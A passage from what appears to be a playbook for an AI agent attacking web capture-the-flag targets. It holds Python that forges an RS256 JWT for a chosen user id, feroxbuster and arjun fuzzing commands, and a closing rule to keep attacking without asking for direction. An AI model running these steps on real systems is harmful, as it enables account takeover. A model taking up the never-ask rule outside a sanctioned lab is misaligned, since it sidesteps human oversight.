from cryptography.hazmat.primitives.serialization import load_pem_private_key

with open('C:/Tools/CTF/<challenge-name>/exploits/private_key.pem', 'rb') as f:
    private_key = load_pem_private_key(f.read(), password=None)

# Match the claim name the app's verify function reads (user_id / sub / id / userId)
token = jwt.encode(
    {"user_id": "<target-uuid>"},
    private_key,
    algorithm="RS256",
    headers={"kid": "pwned", "alg": "RS256", "typ": "JWT"}
)
print("TOKEN:", token)
EOF
```

Use the forged token as the `auth_token` cookie (or Bearer header) and re-probe all previously 403'd endpoints.

## 7. Fuzzing (only after steps 5-6 exhausted)

`ctf-init.sh` already ran feroxbuster and (for htb) nuclei in step 2 — check `recon/ferox.txt` and `recon/nuclei.txt` before re-running anything. If those files have unexplored hits, work through them first instead of re-scanning.

Only re-run feroxbuster if you need deeper coverage than the medium wordlist gave you, or want to target a specific subpath:
```bash
feroxbuster -u <target>/<specific-subpath> -w /c/Tools/SecLists/Discovery/Web-Content/raft-large-directories.txt \
  --depth 2 -t 20 --timeout 5 -q 2>&1 | head -100
```

Parameter discovery on interesting endpoints (not covered by step 2):
```bash
python -m arjun -u <target>/api/<endpoint> -m GET -q 2>&1 | head -40
python -m arjun -u <target>/api/<endpoint> -m POST -q 2>&1 | head -40
```

If fuzzing finds new endpoints → loop back to step 5, probe them, run applicable 5.5 sections.

## 8. Loop gate — no flag yet

If no flag has been found:

1. Update notes.md `## Exploitation log` with everything tried and what each returned
2. Print status table:
   | Surface | Tested | Result |
   |---------|--------|--------|
   | IDOR    | yes/no | ...    |
   | Mass assignment | yes/no | ... |
   | ... | | |
3. Pick the single most promising untested or partially-tested vector and immediately pursue it — do not ask, just go
4. If genuinely out of ideas on the most promising vector, check the matching folder in `/c/Obsidian notes/Pentesting notes/02-AppSec/` (see table in step 5.5) for techniques not yet tried
5. Loop back to step 5.5 and keep attacking

**The goal is the flag. Do not stop, do not ask for direction, do not summarise and wait. Keep going until the flag is in hand or every surface in the status table is marked exhausted.**
